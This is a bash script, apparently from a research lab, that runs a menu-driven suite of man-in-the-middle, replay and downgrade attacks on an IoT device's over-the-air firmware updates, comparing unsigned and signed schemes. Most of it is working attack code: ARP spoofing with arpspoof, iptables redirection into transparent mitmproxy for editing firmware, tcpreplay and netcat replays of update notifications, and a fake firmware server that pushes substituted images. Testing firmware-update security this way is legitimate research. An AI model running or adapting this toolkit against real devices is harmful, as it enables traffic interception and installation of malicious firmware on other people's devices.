#!/bin/bash
# Script for adversary device to perform MITM, Replay and Downgrade attack on IoT device
# Note - this script is not endorsed for usage outside of our research

# Configuration
TARGET_IP="192.168.1.15"      # IoT device IP
FOTA_SERVER_IP="192.168.1.14" # Legitimate FOTA server IP
ADVERSARY_IP="192.168.1.16"   # Attacker's IP (this machine)
OUTPUT_DIR="captured_files"
LISTEN_PORT=9999             # UDP port for firmware notifications
WEB_SERVER_PORT=80           # Web server port for firmware distribution
CSV_FILE="attack_metrics.csv" # CSV file for logging results

# Create output directory
mkdir -p "$OUTPUT_DIR"

# Initialize CSV file if it doesn't exist
init_csv() {
    if [ ! -f "$CSV_FILE" ]; then
        echo "Timestamp,Attack Vector,Outcome,Protocol,Target IP" > "$CSV_FILE"
        echo "[+] Created metrics log file: $CSV_FILE"
    fi
}

# Log results to CSV - attack_vector, outcome, protocol, details
log_to_csv() {
    local timestamp=$(date "+%Y-%m-%d %H:%M:%S")
    local attack_vector="$1"
    local outcome="$2"
    local protocol="$3"
    local details="$4"  # Not used in CSV anymore
    local time_taken="$5"  # Not used in CSV anymore
    
    echo "$timestamp,$attack_vector,$outcome,$protocol,$TARGET_IP" >> "$CSV_FILE"
    echo "[+] Metrics logged to $CSV_FILE"
}

# Function to show menu
show_menu() {
    clear
    echo "====================================="
    echo "      FOTA Security Attack Suite     "
    echo "====================================="
    echo "1. Setup Adversary Environment"
    echo "2. MITM Attack (Capture & Modify Firmware)"
    echo "3. Replay Attack"
    echo "4. Downgrade Attack"
    echo "5. Exit"
    echo "====================================="
    read -p "Select an option: " choice
}

# Function to setup environment
setup_environment() {
    echo "[+] Setting up adversary environment..."
    local start_time=$(date +%s)
    
    # Check if apache is installed
    if ! command -v apache2 &> /dev/null; then
        echo "[!] Apache2 is not installed. Installing..."
        apt-get update
        apt-get install apache2 -y
    fi
    
    # Create directories for the fake FOTA server
    mkdir -p /var/www/html/firmware
    mkdir -p /var/www/html/keys
    
    # Set permissions
    chmod -R 755 /var/www/html/firmware
    chmod -R 755 /var/www/html/keys
    
    # Start Apache if not running
    if ! systemctl is-active --quiet apache2; then
        systemctl start apache2
    fi
    
    # Install necessary tools
    apt-get install netcat-traditional tcpdump mitmproxy dsniff python3-scapy bc -y
    
    local end_time=$(date +%s)
    local time_taken=$((end_time - start_time))
    
    echo "[+] Environment setup complete!"
    echo "[+] Web server running on $ADVERSARY_IP:$WEB_SERVER_PORT"
    echo "[+] Files will be served from /var/www/html/firmware"
    
    # Log the setup
    log_to_csv "Environment Setup" "Complete" "N/A" "Web server and tools installed" "$time_taken"
    
    read -p "Press Enter to continue..."
}

# Function for MITM attack
mitm_attack() {
    echo "[+] Starting MITM Attack..."
    local start_time=$(date +%s)
    
    echo "[+] This attack will specifically target unsigned firmware updates (AES-128/ChaCha20)"
    echo ""
    echo "[!] The following steps will be performed:"
    echo "    1. Capture HTTP traffic between IoT device and FOTA server"
    echo "    2. Intercept unsigned firmware updates"
    echo "    3. Modify firmware (done by user)"
    echo "    4. Forward to IoT device"
    echo ""
    
    # Ask user which protocol to target
    echo "Select firmware protocol to attack:"
    echo "1. AES-128 (vulnerable to MITM)"
    echo "2. ChaCha20 (vulnerable to MITM)"
    echo "3. ECDSA (protected by signature)"
    echo "4. Ed25519 (protected by signature)"
    echo "5. ECDH (protected by signature)"
    
    read -p "Select protocol [1-5]: " proto_choice
    
    case $proto_choice in
        1) PROTOCOL="aes-128"; EXPECTED_OUTCOME="Success" ;;
        2) PROTOCOL="chacha20"; EXPECTED_OUTCOME="Success" ;;
        3) PROTOCOL="ecdsa"; EXPECTED_OUTCOME="Fail" ;;
        4) PROTOCOL="ed25519"; EXPECTED_OUTCOME="Fail" ;;
        5) PROTOCOL="ecdh"; EXPECTED_OUTCOME="Fail" ;;
        *) echo "[!] Invalid choice, defaulting to aes-128"; PROTOCOL="aes-128"; EXPECTED_OUTCOME="Success" ;;
    esac
    
    echo "[+] Starting MITM proxy to intercept $PROTOCOL firmware traffic..."
    echo "[+] Press Ctrl+C when done capturing" 
    
    # Create directory for captured files
    mkdir -p "$OUTPUT_DIR/mitm_captured"
    
    # Start mitmproxy in transparent mode
    echo "[!] Running: sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080"
    sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
    
    # Instructions for manual interception
    echo ""
    echo "[i] Manual steps to complete MITM attack:"
    echo "1. After starting mitmproxy, ARP spoof the IoT device to route traffic through you"
    echo "   Run in separate terminal: sudo arpspoof -i wlan0 -t $TARGET_IP $FOTA_SERVER_IP"
    echo ""
    echo "2. When a firmware file is requested, mitmproxy will intercept it"
    echo "3. For unsigned protocols ($PROTOCOL), you can modify the firmware content"
    echo "   using the 'm' key in mitmproxy"
    echo "4. For signed protocols, any modification will cause signature verification to fail"
    echo ""
    echo "[i] Specifically with mitmproxy:"
    echo "   - Press 'e' to edit the intercepted firmware"
    echo "   - Make your modifications (binary-safe for encrypted content)"
    echo "   - Save and allow the modified firmware to be forwarded to the device"
    echo ""

    # Add a pause here before starting mitmproxy
    read -p "Open a new terminal now to run the arpspoof command, then press Enter to start mitmproxy..."

    # Start mitmproxy
    echo "[+] Starting mitmproxy on port 8080..."
    echo "[+] Press 'q' to quit mitmproxy when done"
    sudo mitmproxy -p 8080 --mode transparent -w "$OUTPUT_DIR/mitm_captured/firmware_capture.mitm"
    
    # Clean up iptables rule when done
    sudo iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
    
    local end_time=$(date +%s)
    local time_taken=$((end_time - start_time))
    
    echo "[+] MITM attack simulation complete"
    echo "[+] Captured traffic saved to $OUTPUT_DIR/mitm_captured/firmware_capture.mitm"
    
    # Calculate capture size
    local capture_size=$(du -h "$OUTPUT_DIR/mitm_captured/firmware_capture.mitm" | cut -f1)
    
    # Determine actual outcome - this would need to be confirmed by the user
    read -p "Did the attack allow you to modify firmware successfully? (y/n): " attack_success
    if [[ "$attack_success" == "y" || "$attack_success" == "Y" ]]; then
        ACTUAL_OUTCOME="Success"
        local details="Captured traffic size: $capture_size; Modified firmware successfully; Expected: $EXPECTED_OUTCOME; Actual: $ACTUAL_OUTCOME"
    else
        ACTUAL_OUTCOME="Fail"
        local details="Captured traffic size: $capture_size; Failed to modify firmware; Expected: $EXPECTED_OUTCOME; Actual: $ACTUAL_OUTCOME"
    fi
    
    # Log the MITM attack
    log_to_csv "MITM Attack" "$ACTUAL_OUTCOME" "$PROTOCOL" "$details" "$time_taken"
    
    read -p "Press Enter to continue..."
}

# Function for replay attack
replay_attack() {
    echo "[+] Starting Replay Attack..."
    local start_time=$(date +%s)
    
    echo "[+] This attack will replay a previously captured firmware update notification"
    echo "[+] The IoT device should reject it if timestamp protection is working"
    echo ""
    
    # Ask which protocol to test replay attack against
    echo "Select protocol to test replay attack against:"
    echo "1. AES-128"
    echo "2. ChaCha20"
    echo "3. ECDSA"
    echo "4. Ed25519"
    echo "5. ECDH"
    
    read -p "Select protocol [1-5]: " proto_choice
    
    case $proto_choice in
        1) PROTOCOL="aes-128" ;;
        2) PROTOCOL="chacha20" ;;
        3) PROTOCOL="ecdsa" ;;
        4) PROTOCOL="ed25519" ;;
        5) PROTOCOL="ecdh" ;;
        *) echo "[!] Invalid choice, defaulting to aes-128"; PROTOCOL="aes-128" ;;
    esac
    
    # Check if we have already captured a notification
    if [ -f "$OUTPUT_DIR/firmware_notification.cap" ]; then
        echo "[+] Found existing notification capture"
    else
        echo "[+] No captured notification found. Let's capture one first."
        echo "[+] Starting UDP capture on port $LISTEN_PORT..."
        echo "[+] Press Ctrl+C after a firmware update notification has been sent"
        
        # Start packet capture focused on UDP port 9999
        sudo tcpdump -i any -w "$OUTPUT_DIR/firmware_notification.cap" "udp port $LISTEN_PORT" -v
    fi
    
    echo "[+] Replaying a notification that will be detected as being over 1 hour old..."
    echo "[+] In a real situation, this would be an old packet or we would modify timestamps"
    
    # Simulate waiting or using an old notification
    sleep 2
    
    # Two approaches to replay:
    # 1. Use tcpreplay to replay the captured packet
    echo "[i] Using tcpreplay to resend the captured UDP packet"
    sudo tcpreplay -i wlan0 "$OUTPUT_DIR/firmware_notification.cap" 2>/dev/null || 
        echo "[!] tcpreplay failed, trying netcat method instead"
    
    # 2. Or directly use netcat if we know the content
    echo "[i] Also sending a direct netcat message to simulate notification"
    # Choose an old firmware name to simulate an old update
    OLD_FIRMWARE="${PROTOCOL}_firmware_v1.enc"
    echo "${OLD_FIRMWARE}|${ADVERSARY_IP}" | nc -u -w1 $TARGET_IP $LISTEN_PORT
    
    local end_time=$(date +%s)
    local time_taken=$((end_time - start_time))
    
    echo ""
    echo "[+] Replay attack attempted"
    echo "[+] If the IoT device properly checks timestamps, this attack should be rejected"
    echo "[+] Check the IoT device logs for 'REJECT | Firmware file is over 1 hour old'"
    
    # Determine expected outcome based on proper time validation
    local EXPECTED_OUTCOME="Fail" # All protocols should reject replays if time checks are implemented
    
    # Ask user for the actual outcome from device logs
    read -p "Was the update rejected due to timestamp validation? (y/n): " rejected
    
    if [[ "$rejected" == "y" || "$rejected" == "Y" ]]; then
        local ACTUAL_OUTCOME="Fail" # Attack failed (good security)
        local details="Replay detection working; IoT device rejected old firmware notification"
    else
        local ACTUAL_OUTCOME="Success" # Attack succeeded (bad security)
        local details="Replay detection failed; IoT device accepted old firmware notification"
    fi
    
    # Log the replay attack
    log_to_csv "Replay Attack" "$ACTUAL_OUTCOME" "$PROTOCOL" "$details" "$time_taken"
    
    read -p "Press Enter to continue..."
}

# Function for downgrade attack
downgrade_attack() {
    echo "[+] Starting Downgrade Attack..."
    local start_time=$(date +%s)
    
    echo "[!] Important experiment notes:"
    echo "    * This attack attempts to serve an alternative firmware to the IoT device"
    echo "    * It simulates an attacker trying to serve a downgraded or malicious version"
    echo "    * Signature protocols should reject unauthorized firmware"
    echo ""
    read -p "Press Enter to continue..." 
    
    # Ask which protocol to test downgrade attack against
    echo "Select protocol to test firmware authenticity against:"
    echo "1. AES-128 (should be vulnerable)"
    echo "2. ChaCha20 (should be vulnerable)"
    echo "3. ECDSA (should be protected)"
    echo "4. Ed25519 (should be protected)"
    echo "5. ECDH (should be protected)"
    
    read -p "Select protocol [1-5]: " proto_choice
    
    case $proto_choice in
        1) PROTOCOL="aes-128"; VULNERABLE="yes"; EXPECTED_OUTCOME="Success" ;;
        2) PROTOCOL="chacha20"; VULNERABLE="yes"; EXPECTED_OUTCOME="Success" ;;
        3) PROTOCOL="ecdsa"; VULNERABLE="no"; EXPECTED_OUTCOME="Fail" ;;
        4) PROTOCOL="ed25519"; VULNERABLE="no"; EXPECTED_OUTCOME="Fail" ;;
        5) PROTOCOL="ecdh"; VULNERABLE="no"; EXPECTED_OUTCOME="Fail" ;;
        *) echo "[!] Invalid choice, defaulting to aes-128"; PROTOCOL="aes-128"; VULNERABLE="yes"; EXPECTED_OUTCOME="Success" ;;
    esac
    
    echo "[+] Testing firmware authenticity control on $PROTOCOL protocol"
    
    if [ "$VULNERABLE" = "yes" ]; then
        echo "[i] $PROTOCOL is unsigned and should be vulnerable to substitution/downgrade"
    else
        echo "[i] $PROTOCOL uses signatures and should be protected from unauthorized firmware"
    fi
    
    # Ask for alternative firmware files
    echo ""
    echo "[!] For this attack demonstration, you need:"
    echo "    1. An alternative firmware file (e.g. ${PROTOCOL}_firmware_alt.enc)"
    echo "    2. If using signed protocol, its signature file (e.g. ${PROTOCOL}_firmware_alt.sig)"
    echo ""
    
    read -p "Enter path to alternative firmware file: " FIRMWARE_PATH
    
    if [ ! -f "$FIRMWARE_PATH" ]; then
        echo "[!] Firmware file not found!"
        
        local end_time=$(date +%s)
        local time_taken=$((end_time - start_time))
        
        # Log failed attempt
        log_to_csv "Downgrade Attack" "Error" "$PROTOCOL" "Firmware file not found" "$time_taken"
        
        read -p "Press Enter to continue..."
        return
    fi
    
    FIRMWARE_FILENAME=$(basename "$FIRMWARE_PATH")
    
    # Ensure Apache is running
    if ! systemctl is-active --quiet apache2; then
        echo "[!] Apache web server is not running! Starting it..."
        systemctl start apache2
    fi

    # Make sure the firmware directory exists
    sudo mkdir -p "/var/www/html/firmware"
    sudo chmod 755 "/var/www/html/firmware"
    
    # Copy the firmware to our adversary web server
    echo "[+] Copying firmware to adversary web server..."
    sudo cp "$FIRMWARE_PATH" "/var/www/html/firmware/$FIRMWARE_FILENAME"
    
    # Set appropriate permissions
    sudo chmod 644 "/var/www/html/firmware/$FIRMWARE_FILENAME"
    
    # Update the timestamp to bypass replay detection
    sudo touch "/var/www/html/firmware/$FIRMWARE_FILENAME"
    
    # If signed protocol, handle the signature file
    if [ "$VULNERABLE" = "no" ]; then
        SIG_PATH="${FIRMWARE_PATH%.enc}.sig"
        if [ -f "$SIG_PATH" ]; then
            echo "[+] Copying signature file..."
            SIG_FILENAME=$(basename "$SIG_PATH")
            sudo cp "$SIG_PATH" "/var/www/html/firmware/$SIG_FILENAME"
            sudo chmod 644 "/var/www/html/firmware/$SIG_FILENAME"
            sudo touch "/var/www/html/firmware/$SIG_FILENAME"
        else
            echo "[!] Warning: Signature file not found at $SIG_PATH"
            echo "[!] Attack will definitely fail without valid signature"
        fi
        
        # For ECDH, also need to handle the shared secret
        if [ "$PROTOCOL" = "ecdh" ]; then
            # Look for shared secret in the same directory as firmware
            FIRMWARE_DIR=$(dirname "$FIRMWARE_PATH")
            SHARED_SECRET="${FIRMWARE_DIR}/ecdh_shared_secret.bin"
            
            if [ -f "$SHARED_SECRET" ]; then
                echo "[+] Copying ECDH shared secret file..."
                sudo cp "$SHARED_SECRET" "/var/www/html/firmware/"
                sudo chmod 644 "/var/www/html/firmware/ecdh_shared_secret.bin"
                sudo touch "/var/www/html/firmware/ecdh_shared_secret.bin"
            else
                echo "[!] Warning: ECDH shared secret file not found at $SHARED_SECRET"
                echo "[!] ECDH attack will fail without shared secret"
            fi
        fi
    fi
    
    # Get our IP address (adversary machine)
    ADVERSARY_IP=$(hostname -I | awk '{print $1}')
    if [ -z "$ADVERSARY_IP" ]; then
        ADVERSARY_IP="$ADVERSARY_IP" # Fallback to configured value if hostname -I fails
    fi
    
    # Send notification to IoT device (simulating FOTA server)
    echo "[+] Sending firmware update notification to IoT device $TARGET_IP:$LISTEN_PORT..."
    echo "${FIRMWARE_FILENAME}|${ADVERSARY_IP}" | nc -u -w1 $TARGET_IP $LISTEN_PORT
    
    local end_time=$(date +%s)
    local time_taken=$((end_time - start_time))
    
    echo "[+] Notification sent for alternative firmware"
    echo "[+] Check the IoT device for its response..."
    echo ""
    echo "[i] If using signed protocol ($PROTOCOL), the IoT device should:"
    echo "    - Verify the signature for authentication"
    echo "    - Reject our firmware if it doesn't match the signature"
    echo ""
    echo "[i] If using unsigned protocol ($PROTOCOL), the IoT device has no way to verify"
    echo "    the firmware source and may accept our version"
    
    # Ask user for the actual outcome
    read -p "Did the IoT device accept the firmware? (y/n): " accepted_alt
    
    if [[ "$accepted_alt" == "y" || "$accepted_alt" == "Y" ]]; then
        local ACTUAL_OUTCOME="Success" # Attack succeeded (firmware was accepted)
        local details="Authentication control bypassed; Alternative firmware was accepted"
    else
        local ACTUAL_OUTCOME="Fail" # Attack failed (firmware was rejected)
        local details="Authentication control worked; Alternative firmware was rejected"
    fi
    
    # Log the downgrade attack
    log_to_csv "Downgrade Attack" "$ACTUAL_OUTCOME" "$PROTOCOL" "$details" "$time_taken"
    
    read -p "Press Enter to continue..."
}

# Main program logic
main() {
    # Initialize CSV file
    init_csv
    
    while true; do
        show_menu
        case $choice in
            1) setup_environment ;;
            2) mitm_attack ;;
            3) replay_attack ;;
            4) downgrade_attack ;;
            5) echo "Exiting..."; exit 0 ;;
            *) echo "Invalid option, try again" ;;
        esac
    done
}

# Run the main function
main